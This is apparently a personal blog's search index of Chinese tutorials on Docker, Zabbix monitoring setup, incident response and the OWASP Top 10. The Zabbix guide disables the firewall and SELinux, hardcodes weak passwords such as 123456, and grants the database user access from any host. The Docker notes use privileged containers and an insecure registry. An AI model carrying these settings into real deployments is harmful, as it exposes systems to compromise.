ADD复制指定路径下的内容到容器中的指定路径下 格式：ADD &lt;src&gt; &lt;dest&gt; &lt;src&gt;可以是Dockerfile所在目录的相对路径（文件或目录）或URL或tar文件（tar文件会自动解压到&lt;dest&gt;路径下） &lt;dest&gt;可以是镜像内绝对路径，或相对于工作目录(WORKDIR)的相对路径 路径格式支持正则表达式 COPY复制本地主机指定路径下的内容（为Dockerfile所在目录的相对路径，文件或目录）到镜像中的指定路径下。目标路径不存在时，会自动创建 路径格式支持正则表达式 ENTRYPOINT指定镜像的默认入口命令，该入口命令会在启动容器时作为根命令执行，所有传入值作为该命令的参数 格式： ENTRYPOINT [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;] (exec调用执行) ENTRYPOINT command param1 param2（shell中执行） 此时，CMD指令指定值将作为根命令的参数 每个Dockerfile只能执行一条ENTRYPOINT命令，多个ENTRYPOINT命令时，只最后一条被执行。 在运行容器时，此指令可被--entrypoint参数覆盖掉 VOLUME创建一个数据卷挂载点 格式：VOLUME [&quot;/data&quot;] 创建一个可以从本地主机或其他容器挂载的挂载点，一般用来存放数据库和需要保存的数据等 USER指定运行容器时的用户名或UID，后续的 RUN 也会使用指定用户 格式：USER daemon 当服务不需要管理员权限时，可以通过该命令指定运行用户。并且可以在之前创建所需要的用户，例如： 1RUN groupadd -r postgres &amp;&amp; useradd -r -g postgres postgres 要临时获取管理员权限可以使用 gosu 或 sudo。 WORKDIR为后续的 RUN 、 CMD 、 ENTRYPOINT 指令配置工作目录 格式为 WORKDIR /path/to/workdir 可以使用多个 WORKDIR 指令，后续命令如果参数是相对路径，则会基于之前命令指定的路径。例如 1234WORKDIR /a WORKDIR b WORKDIR c RUN pwd 则最终路径为 /a/b/c 。 ARG指定一些镜像内使用的参数，这些参数在执行docker build命令时才以--build-arg &lt;varname&gt;=&lt;value&gt;格式传入 格式：ARG &lt;name&gt; [=&lt;default value&gt;] ONBUILD配置当所创建的镜像作为其他镜像的基础镜像时，所执行的创建操作指令 格式：ONBUILD [INSTRUCTION] 例： Dockerfile1创建镜像A 1234[...]ONBUILD ADD . /app/srcONBUILD RUN /usr/local/bin/python-build --dir /app/src[...] Dockerfile2创建镜像B 1FROM A 使用上方指令，会自动执行ONBUILD指令的内容，即FROM A指令等价于执行指令 12ADD . /app/srcRUN /usr/local/bin/python-build --dir /app/src STOPSIGNAL指定所创建镜像启动的容器接收退出的信号值 格式：STOPSIGNAL signal HEALTHCHECK配置所启动容器如何进行健康检查 格式： HEALTHCHECK [OPTIONS] CMD command：根据所执行命令返回值是否为0来判断 HEALTHCHECK NONE：禁止基础镜像中的健康检查 OPTIONS支持： --interval=DURATION：检查的时间间隔（默认30s） --timeout=DURATION：每次检查等待结果的超时时间（默认30s） --retries=N：失败重试次数（默认3次） SHELL指定其他命令使用shell时的默认shell类型 格式：SHELL [&quot;executable&quot;,&quot;parameters&quot;] 默认值：[&quot;/bin/sh&quot;,&quot;-c&quot;] 在Dockerfile中使用multi-stage1234567891011FROM golang:1.7.3 as builderWORKDIR /go/src/github.com/sparkdevo/href-counter/RUN go get -d -v golang.org/x/net/htmlCOPY app.go .RUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app .FROM alpine:latestRUN apk --no-cache add ca-certificatesWORKDIR /root/COPY --from=builder /go/src/github.com/sparkdevo/href-counter/app .CMD [&quot;./app&quot;] 这个Dockerfile文件的特点是同时存在多个FROM指令，每个FROM指令代表一个stage的开始部分。我们可以把一个stage的产物拷贝到另一个stage中。 把第一个stage使用as语法命名为builder，然后在后面的stage中通过名称builder进行引用--from=builder 创建镜像编写Dockerfile完成后，使用docker build命令创建镜像 格式：docker build [options] dir 过程：读取指定路径下（包括子目录）的Dockerfile，并将该目录下所有内容发送给Docker服务端，由服务端创建镜像。所以，除非特殊需要，一般建议放置Dockerfile的目录为空目录。 12docker build -t re/fi /tmp/docker_build/-t：指定生成镜像的标签信息 使用.dockerignore文件此文件用于让Docker忽略匹配路径下的目录和文件 12345# comment */temp* */*/temp* tmp? ~* 实践经验 精简镜像用途 选用合适的基础镜像 提供足够清晰的命令注释和维护者信息 正确使用版本号 减少镜像层数 及时删除临时文件和缓存文件 提高生成速度 调整合理的指令顺序 减少外部源的干扰]]></content>
      <categories>
        <category>Docker技术</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker端口映射与容器互联]]></title>
    <url>%2F2018%2F08%2F09%2FDocker%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E4%B8%8E%E5%AE%B9%E5%99%A8%E4%BA%92%E8%81%94%2F</url>
    <content type="text"><![CDATA[​ 在实践中，经常碰到需要多个服务组件容器共同协作的情况，这往往需要多个容器之间能够互相访问到对方的服务。Docker提供两种方法来满足服务访问的基本需求 允许映射容器内应用的服务端口到本地宿主主机。 互联机制实现多个容器间通过容器名来快速访问。 端口映射实现访问容器从外部访问容器应用​ 在启动容器时，如果不指定对应的参数，在容器外部是无法通过网络来访问容器内的网络应用和服务的。 1docker run -d -P training/webapp python app.py 1.-P（大写）参数表示Docker会随机选择本地主机的一个端口映射到内部容器开放的网络端口。可通过docker ps -l (-l :显示最近创建的容器)查看。访问本地主机的相应端口即可访问容器内对应端口提供的服务。 2.-p（小写）可以指定要映射的端口，并且，在一个指定端口上只可以绑定一个容器。支持的格式有IP:HostPort:ContainerPort | IP::ContainerPort | HostPort:ContainerPort 映射所有接口地址HostPort:ContainerPort方式 1docker run -d -p 5000:5000 -p 3000:80 training/webapp python app.py 默认绑定本地所有接口上的所有地址。 将本地的5000端口映射到容器的5000端口，将本地的3000端口映射到容器的80端口。 映射到指定地址的指定接口IP:HostPort:ContainerPort方式 1docker run -d -p 127.0.0.1:3000:80 training/webapp python app.py 映射到指定地址的任意端口IP::ContainerPort方式 12docker run -d -p 127.0.0.1::5000 training/webapp python app.pydocker run -d -p 127.0.0.1:5000:5000/udp training/webapp python app.py 绑定本地主机的任意端口到容器的5000端口，本地主机会自动分配一个端口。 查看端口映射配置1docker port Container_name Container_port 容器有自己的内部网络和IP地址，使用docker inspect Container_id可获取容器的具体信息。 互联机制实现便捷互访​ 容器的互联是一种让多个容器中的应用进行快速交互的方式。它会在源和接收容器之间创建连接关系，接收容器可以通过容器名快速访问到源容器，而不用指定具体的IP地址。 自定义容器命名1docker run -d -P --name web training/webapp python app.py 容器的名称是唯一的。 容器互联1234docker run -d --name db training/postgresdocker run -d -P --name web --link db:dbweb training/webapp python app.py--link name:alias ：name为要连接的容器名，alias为这个连接的别名 1docker ps ​ 自定义命名的容器db和web。web容器为子容器，db容器为父容器。用户可以连接多个子容器到父容器。 ​ 这相当于在两个互联的容器之间建立了一个虚拟通道，而且不用映射它们的端口到本地主机上。在启动db容器时并没有指定-p和-P参数，从而避免了暴露服务端口到外部网络上。 Docker通过两种方式为容器公开连接信息1.更新环境变量； 2.更新/etc/hosts文件。 1.使用env命令来查看web1容器的环境变量: 1docker run --rm --name web1 --link db:db training/webapp env 其中DB_开头的环境变量是提供web1容器连接db容器使用的，前缀采用大写的连接别名。 2.除了环境变量之外，Docker还添加host信息到子容器的/etc/hosts文件1docker run -it --rm --name web2 --link db:db training/webapp /bin/bash 可以使用ping测试容器连通性]]></content>
      <categories>
        <category>Docker技术</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker数据管理]]></title>
    <url>%2F2018%2F08%2F08%2FDocker%E6%95%B0%E6%8D%AE%E7%AE%A1%E7%90%86%2F</url>
    <content type="text"><![CDATA[​ 生产环境中使用Docker的过程中，往往需要对数据进行持久化，或者需要在多个容器之间进行数据共享，这必然涉及到容器的数据管理操作。 ​ 容器中管理数据主要有两种方式： 数据卷：容器内数据直接映射到本地主机环境 数据卷容器：使用特定容器维护数据卷 数据卷​ 数据卷是一个可供容器使用的特殊目录，它将主机操作系统目录直接映射进容器，类似于Linux中的mount操作。 ​ 数据卷特性： 数据卷可以在容器之间共享和重用，容器间传递数据将变的高效方便 对数据卷内数据的修改会立马生效，无论是容器内操作还是本地操作 对数据卷的更新不会影响镜像，解耦了应用和数据 卷会一直存在，直到没有容器使用，可以安全的卸载它 在容器内创建一个数据卷123456docker run -v /dir-v：在容器内创建一个数据卷，多次使用-v可创建多个数据卷docker run -d --name ub -v /aa ubuntu:latest /bin/bash-d：在后台以守护态运行容器--name：指定容器的别名 上图的目录即为挂载到容器的本地主机路径 挂载一个主机目录作为数据卷(推荐)123docker run -it -P --name bu -v /opt/a:/b:ro ubuntu:latest /bin/bash-P：端口映射，随机本地端口映射容器开放端口 将主机的/opt/a目录加载到容器的/b目录，权限为只读 本地路径需使用绝对路径，如果目录不存在，Docker会自动创建 Docker挂载的数据卷默认权限是读写（rw） 挂载一个本地主机文件作为数据卷(不推荐)123docker run --rm -it -v ~/1.txt:/2.txt ubuntu /bin/bash--rm=true|false：容器退出后是否自动删除，不可与-d同时使用 数据卷容器​ 如果用户需要在多个容器之间共享一些持续更新的数据，最简单的方式是使用数据卷容器。 ​ 数据卷容器也是一个容器，它的目的是专门用来提供数据卷供其他容器挂载 1.创建数据卷容器data，并在其中创建一个数据卷挂载到/dbdata 1docker run -it -v /dbdata --name data ubuntu 2.在其他容器中，挂载data容器中的数据卷 1docker run -it --volumes-from data --name db1 ubuntu 3.可以从其他已挂载了数据卷的容器来挂载数据卷 1docker run -d --name db2 --volumes-from db1 ubuntu 4.多次使用--volumes-from参数可从多个容器挂载多个数据卷 5.删除数据卷 数据卷只有在下列情况下才能被删除： 1.docker rm -v删除容器时添加了-v选项 2.docker run --rm运行容器时添加了--rm选项 否则，会在/var/lib/docker/volumes目录中遗留很多不明目录。 利用数据卷容器来迁移数据​ 可以利用数据卷容器对其中的数据卷进行备份，恢复，以实现数据的迁移。 备份1234docker run --privileged --rm --volumes-from data -v $(pwd):/backup --name worker ubuntu tar cvf /backup/backup.tar /dbdata--rm：在容器退出时就能够自动清理容器内部的文件系统，不可与-d同时使用--privileged：使用该参数，容器内的root拥有真正的root权限。否则，容器内的root只是外部的一个普通用户权限。 首先，利用ubuntu镜像创建了一个容器worker；其次，使用--volumes-from参数让worker容器挂载data容器的dbdata数据卷；再次，使用-v参数来挂载本地当前目录到worker容器的/backup目录； 最后，容器启动后，使用tar cvf /backup/backup.tar /dbdata命令将/dbdata目录下内容备份为容器内的/backup/backup.tar，即本地主机当前目录下的backup.tar 恢复1.首先创建一个带有数据卷的容器data2 1docker run -it -v /dbdata2 --name data2 ubuntu /bin/bash 2.创建一个新的容器，挂载data2容器的数据卷，并使用tar命令解压备份文件到所挂载的数据卷中 1docker run --privileged --volumes-from data2 -v $(pwd):/backup ubuntu tar xvf /backup/backup.tar -C /dbdata2]]></content>
      <categories>
        <category>Docker技术</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MarkDown图片问题]]></title>
    <url>%2F2018%2F08%2F08%2FMarkDown%E5%9B%BE%E7%89%87%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[使用Github+hexo搭建博客之后，markdown写作手法确实会节省不少时间与工作量。但是，markdown的图片功能确实不尽如人意，本地文档上传至Github后，无法连接本地路径图片。 构建Github图片仓库 新建仓库登陆Github 记录一下新建仓库的clone地址 本地clone仓库本地使用git bash将仓库clone到本地 本地相应目录中会生成仓库名称的文件夹（此处为Test） 添加图片文件进入Text目录，手动添加图片文件 将本地内容上传至Github仓库123git add . （注：别忘记后面的.，此操作是把Test文件夹下面的文件都添加进来）git commit -m &quot;提交信息&quot; （注：“提交信息”里面换成你需要，如“first commit”,省略-m会报错）git push -u origin master （注：此操作目的是把本地仓库push到github上面，此步骤需要你输入帐号和密码） MarkDown使用仓库图片访问Github仓库，进入图片页面，右击复制图片，将图片链接加入MarkDown文档中，则文档会包含仓库中的图片，而不会依赖于本地图片资源。 参考链接https://www.cnblogs.com/cxk1995/p/5800196.html]]></content>
      <categories>
        <category>搭建博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[应急响应]]></title>
    <url>%2F2018%2F08%2F08%2F%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%2F</url>
    <content type="text"><![CDATA[应急响应的背景应急响应服务的诞生—-CERT/CC1988年Morris蠕虫事件直接导致了CERT/CC的诞生。 CERT/CC服务的内容 安全事件响应 安全事件分析和软件安全缺陷研究 缺陷知识库开发 信息发布：缺陷、公告、总结、统计、补丁、工具 教育与培训：CSIRT管理、CSIRT技术培训、系统和网络管理员安全培训 指导其它CSIRT（也称IRT、CERT）组织建设。 应急响应的概念应急响应指组织为了应对突发/重大信息安全事件的发生所做的准备以及在事件发生后所采取的措施。 安全事件指影响一个系统正常工作的情况。这里的系统包括主机范畴内的问题，也包括网络范畴内的问题，例如黑客入侵、信息窃取、拒绝服务攻击、网络流量异常等。 安全事件的分类 恶意程序（僵尸，木马，蠕虫） 网络攻击类（DOS，DDOS，扫描） 信息破坏类（网站内容篡改） 信息内容安全 设备类 自然灾害 其他 安全事件分级原则：信息系统的重要程度，信息系统的损害程度，对社会的影响 特大 重大 严重 一般 应急响应的描述客户的主机或网络正遭到攻击或发现入侵成功的痕迹，而又无法当时解决和追查来源时，安全服务商根据客户的要求以最快的速度赶到现场，协助客户解决问题，查找后门，保存证据和追查来源。 应急响应的目的应急响应服务的目的是最快速度恢复系统的保密性、完整性和可用性，阻止和减小安全事件带来的影响。 应急响应服务的目的是尽可能地减小和控制住网络安全事件的损失，提供有效的响应和恢复指导，并努力防止安全事件的发生。 应急响应服务的特点 技术复杂性与专业性、 知识经验的依赖性 事件突发性 协作能力 应急响应体系指在突发/重大信息安全事件后对包括计算机运行在内的业务运行进行维持或恢复的各种技术和管理策略和规程 。 信息安全应急响应体系的制定是一个周而复始、持续改进的过程，包含以下几个阶段： 应急响应需求分析和应急响应策略的确定 编制应急响应计划文档 应急响应计划的测试、培训、演练和维护 应急响应组应急响应组就是一个或更多的个人组成的团队，能快速执行和处理与安全有关的事件的任务。 为什么需要成立应急响应组 容易协调响应工作 提高专业知识 提高效率 提高先期主动防御能力 更加适合于满足机构的需要 提高联络功能 提高处理制度障碍方面的能力 指导标准GB/T 24364-2009 《信息安全技术 信息安全应急响应计划规范》 GB/T 20988-2007 《信息安全技术 信息系统应急响应规范》 GB/Z 20985-2007 《信息技术 安全技术 信息安全事件管理指南》 GB/Z 20986-2007 《信息安全技术 信息安全事件分类分级指南》 应急响应阶段第一阶段：准备——preparation 第二阶段：检测——detection 第三阶段：遏制——containment 第四阶段：根除——eradication 第五阶段：恢复——recovery 第六阶段：跟踪——follow-up 第一阶段：准备——preparation在事件真正发生之前为事件响应做好相应的准备 ，比如，漏洞扫描、打补丁等，资源准备 第二阶段：检测——detection使用恰当的方法来确认系统或网络中是否出现了恶意代码、网络攻击、目录文件存在被篡改等异常现象 。 事件标记 信息来源 开启审计 事件定级 响应方式 第三阶段：抑制——containment抑制攻击或破环波及的范围 建议组织机构为几类主要的事故建立单独的抑制策略，其标准包括： 潜在的破坏和资源的窃取 证据保留的需要 服务可用性（例如：网络连接，提供给外部当事方的服务） 实施战略需要的时间和资源 战略的有效性（例如：部分遏制事故，完全遏制事故） 解决方案的期限 第四阶段：根除——eradication找到事件的根源彻底清除，防止攻击者再次使用相同的手段对系统或网络造成破坏，引发新的安全事件。 第五阶段：恢复——recovery业务恢复 第六阶段：跟踪——follow-up关注系统恢复以后的安全状况，特别是曾经出问题的地方；建立跟踪文档，规范记录跟踪结果；对响应效果给出评估；对进入司法程序的事件，进行进一步的调查，打击违法犯罪活动 应急响应预案制定应急响应预案内容应急响应预案的包括的主要内容： 确定风险场景 描述可能受到的业务影响 描述使用的预防性策略 描述应急响应策略 识别和排列关键应用系统 行动计划 团队和人员的职责 联络清单 所需资源配置 制定应急响应预案的原则 首先，必须集中管理应急响应预案的版本和发布。 其次，为了建立有效的版本控制体系，必须建立规范的应急响应预案的问题提交、解决、更新、跟踪、发布的渠道和流程。 第三，建立相关的保密管理规定，保证应急响应预案中涉及的秘密信息得到保护。 第四，应急响应预案在内容管理方面应注意内容的分布和粒度，可根据版本和内容的更新频度将应急响应的内容进行适当的分布。 第五，建立合理的应急响应预案的保管制度，强调存放的安全性和易取得性。 成功预案的特点 清楚、简洁 高级管理层支持/组织承诺 不断改进和更新的恢复策略 及时的更新维护 Linux操作系统应急响应 用户、进程、服务、日志、网络等等常规性检查及分析 操作系统中恶意代码检测（Chrootkit、Rootkit hunter工具使用） 日志分析 流量分析 木马查杀并恢复系统 应急响应报告编写 Windows操作系统应急 用户、进程、服务、模块、驱动、日志、网络等等常规性检查及分析 操作系统中恶意代码检测（Icesword、Rootkit Unhooker、Sysprot、Rootkit Unhooker工具使用） 日志分析 流量分析（sniffer pro、windump、wireshark工具） 木马查杀并恢复系统 应急响应报告编写 web应用的应急 web日志分析（对iis、apache、tomcat等中间件日志做分析） 应用恢复 应急响应报告编写]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker仓库]]></title>
    <url>%2F2018%2F08%2F07%2FDocker%E4%BB%93%E5%BA%93%2F</url>
    <content type="text"><![CDATA[Docker Hub公共镜像市场https://hub.docker.com/ 登陆1docker login 基本操作12docker search docker pull 镜像资源分为两类，一类是类似centos这样的基础镜像，称为基础或根镜像，由Docker公司创建，验证，支持，提供 类似ans/centos7镜像，它由Docker用户ans创建并维护。 自动创建利于需要经常升级镜像内程序。 允许用户通过Docker Hub指定跟踪一个目标网站上的项目，一旦项目发生新的提交，则自动执行创建。 国内镜像市场1docker pull registry/&lt;namespace&gt;/&lt;repository&gt;:&lt;tag&gt; 搭建本地私有仓库使用registry镜像创建私有仓库123docker run -d -p 5000:5000 registry-p:指定如何映射到本地主机端口。格式为：主机(宿主)端口:容器端口 自动下载并启动一个registry容器，创建本地的私有仓库服务，监听端口5000 默认情况下，仓库会创建在容器的/var/lib/registry/目录下。可以通过-v参数来将镜像文件存放到本地的指定路径 123docker run -d -p 5000:5000 -v /opt/data/registry:/var/lib/registry/ registry-v:挂载主机上的文件卷到容器内。格式为：主机(宿主)目录:容器目录 管理私有仓库私有仓库地址：10.0.2.2:5000 上传12docker tag old_name:old_tag 10.0.2.2:5000/new_tagdocker push 10.0.2.2:5000/new_tag 验证上传1curl http://10.0.2.2:5000/v1/search 下载新版Docker要求仓库支持SSL/TLS证书 对于内部使用的私有仓库，可以自行配置证书或关闭对仓库的安全性检查 修改Docker daemon的启动参数，添加如下参数，表示信任此私有仓库，不进行安全证书的检查 1DOCKER_OPTS=&quot;--insecure-registry 10.0.2.2:5000&quot; 之后重启Docker服务，并从私有仓库下载镜像到本地 1docker pull 10.0.2.2:5000/new_tag]]></content>
      <categories>
        <category>Docker技术</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[可视化监控Zabbix]]></title>
    <url>%2F2018%2F08%2F07%2F%E5%8F%AF%E8%A7%86%E5%8C%96%E7%9B%91%E6%8E%A7%2F</url>
    <content type="text"><![CDATA[软件：ZABBIX3.4.0 操作系统：cent OS 7 环境准备安装依赖包1yum -y install wget net-snmp-devel OpenIPMI-devel httpd openssl-devel java lrzsz fping-devel libcurl-devel perl-DBI pcre-devel libxml2 libxml2-devel mysql-devel gcc php php-bcmath php-gd php-xml php-mbstring php-ldap php-mysql.x86_64 php-pear php-xmlrpc net-tools wget vim-enhanced 关闭防火墙12systemctl stop firewalld.servicesystemctl disable firewalld.service 关闭SELINUX123sed -i &quot;s/SELINUX=enforcing/SELINUX=disabled/g&quot; /etc/selinux/configgrep SELINUX /etc/selinux/config 搭建LAMP环境1yum -y install mariadb mariadb-server php php-mysql httpd MYSQL配置12systemctl enable mariadb.service # 开机自启systemctl start mariadb.service # 启动 初始化MySQL数据库，配置root用户密码1mysql_secure_installation Remove anonymous users? 删除匿名用户？ Disallow root login remotely? 禁止root远程登陆 Remove test database and access to it? 删除测试数据库并且和访问它 Reload privilege tables now? 重新载入特权表 创建zabbix数据库及其用户12mysql -uroot -p123456 -e &quot;create database zabbix default character set utf8 collate utf8_bin;&quot;mysql -uroot -p123456 -e &quot;grant all on zabbix.* to &apos;zabbix&apos;@&apos;%&apos; identified by &apos;zabbix&apos;;&quot; 启动Apache1systemctl start httpd.service 编译安装zabbix server 3.4安装zabbix守护进程下载tar包https://www.zabbix.com/download 1tar -zxvf zabbix-3.4.0.tar.gz 创建用户账户12groupadd zabbixuseradd -g zabbix zabbix 配置源代码1./configure --prefix=/data/server/zabbix --enable-server --enable-agent --with-mysql --enable-ipv6 --with-net-snmp --with-libcurl --with-libxml2 安装1make install 数据库导入zabbix template使用数据库用户zabbix登录数据库1mysql –uzabbix –p 切换到zabbix数据库1use zabbix 按顺序导入模板数据123source /usr/local/src/zabbix-3.4.0/database/mysql/schema.sqlsource /usr/local/src/zabbix-3.4.0/database/mysql/images.sqlsource /usr/local/src/zabbix-3.4.0/database/mysql/data.sql 查看和编辑配置文件12345678910vi /data/server/zabbix/etc/zabbix/zabbix_server.confLogFile=/tmp/zabbix_server.logDBHost=localhostDBName=zabbixDBUser=zabbixDBPassword=zabbixDBPort=3306Timeout=4LogSlowQueries=3000 配置PHP123456789vim /etc/php.iniphp_value max_execution_time 300php_value memory_limit 128Mphp_value post_max_size 16Mphp_value upload_max_filesize 2Mphp_value max_input_time 300php_value always_populate_raw_post_data -1date.timezone = Asia/Shanghai 安装zabbix web界面123mkdir /var/www/html/zabbixcd /usr/local/src/zabbix-3.4.0/frontends/php cp -a . /var/www/html/zabbix 启动zabbix-server1234systemctl start zabbix-server.servicesystemctl enable zabbix-server.servicesystemctl restart httpd.service 配置zabbix1访问http://ip/zabbix/setup.php 2​ 确认满足所有的软件安装前置条件,如果下图这些显示Failed，那么我们编辑/etc/php.ini，将下图中的配置项都改成要求的大小，未配置的项进行手动添加 如果出现PHP xmlwiter，PHP smlreader off那么请键入下条命令 1yum install php-bcmath php-mbstring php-xmlwriter php-xmlreader 3输入连接数据库的详细信息。Zabbix数据库必须是已经创建好的。 4输入Zabbix Server的详细信息。 5检查设置信息。 6 12cd /var/www/html/zabbix/confrz 7上传完毕后，完成安装。 8Zabbix前端已经就绪！默认的用户名是Admin，密码是zabbix。 配置zabbix-agent安装123rpm -ivh http://mirrors.aliyun.com/zabbix/zabbix/3.0/rhel/6/x86_64/zabbix-release-3.0-1.el6.noarch.rpmyum clean allyum -y install zabbix zabbix-agent 修改配置文件12345678vim /data/server/zabbix/etc/zabbix_agentd.confcat zabbix_agentd.conf | grep -v &quot;#&quot; | grep -v &quot;^$&quot;LogFile=/tmp/zabbix_agentd.logServer=192.168.199.117ListenPort=10050ServerActive=192.168.199.117Hostname=umbrella 在zabbix web端添加该监控机器时，只需要把honst name与该配置文件中的Hostname对应即可 启动12345cd /data/server/zabbix/bin./zabbix_agentd -c /etc/zabbix/zabbix_agentd.confsystemctl start zabbix-agentsystemctl enable zabbix-agent 官方安装文档：https://www.zabbix.com/documentation/3.4/zh/manual/installation/install 排错参考网址：https://www.tuicool.com/articles/bayqqim https://blog.csdn.net/weixin_39366112/article/details/78164049?locationNum=8&amp;fps=1 http://blog.51cto.com/xpu2001/2052634]]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>运维安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OWASP TOP10]]></title>
    <url>%2F2018%2F08%2F06%2FOWASP-TOP10%2F</url>
    <content type="text"><![CDATA[应用程序安全风险攻击者可以通过应用程序中许多不同的路径方法去危害业务或者企业组织。每种路径方法都代表了一种风险。 A1 注入描述几乎任何数据源都能成为注入载体， 包括环境变量、所有类型的用户、参数、外部和内部Web服务。当攻击者可以向解释器发送恶意数据时，注入漏洞产生。 检测注入漏洞十分普遍，尤其是在遗留代码中。注入漏洞 通常能在SQL、LDAP、XPath或是NoSQL查询语句、OS 命令、XML解析器、SMTP包头、表达式语句及ORM查询语句中找到。 注入漏洞很容易通过代码审查发现。扫描器和模糊测试工具可以帮助攻击者找到这些漏洞。 当您的应用存在如下点时，是脆弱的并易受到攻击： 用户提供的数据没有经过应用程序的验证、过滤或净化。 动态查询语句或非参数化的调用，在没有上下文感知转义的情况下，被用于解释器。 在ORM搜索参数中使用了恶意数据，这样搜索就获得包含敏感或未授权的数据。 恶意数据直接被使用或连接，诸如SQL语句或命令在动态查询语句、命令或存储过程中包含结构和恶意数据。 对业务的影响注入能导致数据丢失、破坏或泄露给无授权方，缺乏可审计性或是拒绝服务。注入有时甚至能导致主机被完全接管。 防范防止注入漏洞需要将数据与命令语句、查询语句分隔开来。 最佳选择是使用安全的API，完全避免使用解释器，或提供参数化界面的接口，或迁移到ORM或实体框架。 注意：当参数化时，存储过程仍然可以引入SQL注入，如果 PL/SQL或T-SQL将查询和数据连接在一起，或者执行带有立即执行或exec()的恶意数据。 使用正确的或“白名单”的具有恰当规范化的输入验证方法同样 会有助于防止注入攻击，但这不是一个完整的防御，因为许多应用程序在输入中需要特殊字符，例如文本区域或移动应用程序的API。 对于任何剩余的动态查询，可以使用该解释器的特定转义语法转义特殊字符。OWASP的Java Encoder和类似的库提供了这样的转义例程。 注意：SQL结构，比如：表名、列名等无法转义，因此用户提供 的结构名是非常危险的。这是编写软件中的一个常见问题。 在查询中使用LIMIT和其他SQL控件，以防止在SQL注入时大量地泄露记录。 A2 失效的身份认证描述攻击者可以获得数百万的有效用户名和密码组合，包括证书填充、默认的管理帐户列表、自动的暴力破解和字典攻击工具，以及高级的GPU破解工具。 会话管理攻击很容易被理解，尤其是没有过期的会话密匙。 检测大多数身份和访问管理系统的设计和实现，普遍存在身份认证失效问题。会话管理是身份验证和访问控制的基础，并且存在于所有有状态应用程序中。 确认用户的身份、身份验证和会话管理非常重要，这些措施可用于将恶意的未经身份验证的攻击者与授权用户进行分离。 如果您的应用程序存在如下问题，那么可能存在身份验证的脆弱性： 允许凭证填充，这使得攻击者获得有效用户名和密码的列表。 允许暴力破解或其他自动攻击。 允许默认的、弱的或众所周知的密码（例如Password1或 admin/admin）。 使用弱的或失效的验证凭证，忘记密码程序，例如“基于知识的答案”，这是不安全的。 使用明文、加密或弱散列密码。 缺少或失效的多因素身份验证。 暴露URL中的会话ID（例如URL重写）。 在成功登录后不会更新会话ID。 不正确地使会话ID失效。当用户不活跃的时候，用户会话或认证令牌（特别是单点登录（SSO）令牌）没有正确注销或失效。 对业务的影响攻击者只需要访问几个帐户，或者只需要一个管理员帐户就可以破坏我们的系统。根据应用程序领域的不同， 可能会导致放任洗钱、社会安全欺诈以及用户身份盗窃、泄露法律高度保护的敏感信息。 防范 在可能的情况下，实现多因素身份验证，以防止自动、凭证填充、 暴力破解和被盗凭据再利用攻击。 不要使用发送或部署默认的凭证，特别是管理员用户。 执行弱密码检查，例如测试新或变更的密码 将密码长度、复杂性和循环策略与NIST-800-63B的指导方针的 5.1.1章节-记住秘密，或其他现代的基于证据的密码策略相一致。 确认注册、凭据恢复和API路径，通过对所有输出结果使用相同的消息，用以抵御账户枚举攻击。 限制或逐渐延迟失败的登录尝试。记录所有失败信息并在凭据填充、暴力破解或其他攻击被检测时提醒管理员。 使用服务器端安全的内置会话管理器，在登录后生成高度复杂的新随机会话ID。会话ID不能在URL中，可以安全地存储和当登出、 闲置、绝对超时后使其失效。 A3 敏感数据泄露描述攻击者不是直接攻击密码，而是在传输过程中或从客户端（例如：浏览器） 窃取密钥、发起中间人攻击，或从服务器端窃取明文数据。这通常需要手动攻击。通过使用图形处理单元 （GPU），早前检索的密码数据库可能被暴力破解。 检测在最近几年，这是最常见的、最具影响力的攻击。这个领域最常见的漏洞是不对敏感信息进行加密。在数据加密过程中，常见的问题是不安全的密钥生成和管理以及使用弱加密算法、弱协议和弱密码。特别是使用弱的哈希算法来保护密码。在服务器端，检测传输过程中的数据弱点很容易，但检测存储数据的弱点却非常困难。 首先你需要确认的是哪些数据是敏感数据（包含：传输过程中的数据、存储数据）而需要被加密。例如：密码、信用卡卡号、医 疗记录、个人信息应该被加密，特别是隐私法律或条例中规定需 要加密的数据。对于这些数据，要确定： 在数据传输过程中是否使用明文传输？这和传输协议相关，如： HTTP、SMTP和FTP。外部网络流量非常危险。验证所有的内部通信，如：负载平衡器、Web服务器或后端系统之间的通信。 当数据被长期存储时，无论存储在哪里，它们是否都被加密，加密包含备份数据？ 无论默认条件还是源代码中，是否还在使用任何旧的或脆弱的加密算法？ 是否使用默认加密密钥，生成或重复使用脆弱的加密密钥，或者缺少恰当的密钥管理或密钥回转？ 是否强制加密敏感数据，例如：用户代理（如：浏览器）指令和传输协议是否被加密？ 用户代理（如：应用程序、邮件客户端）是否未验证服务器端证书的有效性？ 对业务的影响这个领域的错误频繁影响那些本应该加密的数据。通常情况下，这些数据通常包括很多个人敏感信息（PII）， 例如：医疗记录、认证凭证、个人隐私、信用卡信息等。 防范对一些需要加密的敏感数据，应该起码做到以下几点： 对系统处理、存储或传输的数据分类，并根据分类进行访问控制。 熟悉与敏感数据保护相关的法律和条例，并根据每项法规要求保护敏感数据。 对于没必要存放的、重要的敏感数据，应当尽快清除，或者通过 PCI DSS标记或拦截。未存储的数据不能被窃取。 确保存储的所有敏感数据被加密。 确保使用了最新的、强大的标准算法或密码、参数、协议和密匙， 并且密钥管理到位。 确保传输过程中的数据被加密，如：使用TLS。确保数据加密被强制执行，如：使用HTTP严格安全传输协议（HSTS）。 禁止缓存对包含敏感数据的响应。 确保使用密码专用算法存储密码，如：Argon2 、 scrypt 、 bcrypt 或者PBKDF2 